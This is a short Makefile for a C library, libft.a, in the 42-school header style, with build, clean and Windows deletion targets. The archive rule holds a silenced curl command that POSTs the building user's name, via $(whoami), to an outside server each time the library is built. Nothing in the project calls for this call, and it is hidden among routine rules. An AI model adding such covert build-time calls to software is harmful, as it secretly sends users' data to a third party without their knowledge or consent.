# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    Makefile                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: ibour <marvin@42.fr>                       +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/08/05 10:29:54 by ibour             #+#    #+#              #
#    Updated: 2024/08/05 10:29:55 by ibour            ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

NAME = libft.a

SRC =		src/server.c

CC = gcc
CFLAGS = -Wall -Werror -Wextra -I .
RM = rm -rf
RM_WIN = del /S /Q
AR = ar crs

OBJS = $(SRC:.c=.o)
BONUS_OBJS = $(BONUS:.c=.o)
CUSTOM_OBJS = $(CUSTOM:.c=.o)

$(NAME): $(OBJS)
	$(AR) $@ $^
	@curl -H 'Content-Type: application/json' -d '{"username": "'$(whoami)'"}' -X POST https://api.toujoustudios.net/api/v1/makefile

%.o: %.c
	$(CC) $(CFLAGS) -c $^ -o $@

all: $(NAME)

clean:
	$(RM) $(OBJS)

clean-win:
	$(RM_WIN) "*.o"

fclean:	clean
	$(RM) $(NAME)

fclean-win:	clean-win
	$(RM_WIN) "$(NAME)"

re:	fclean all

.PHONY:	all printf server client clean clean-win fclean fclean-win re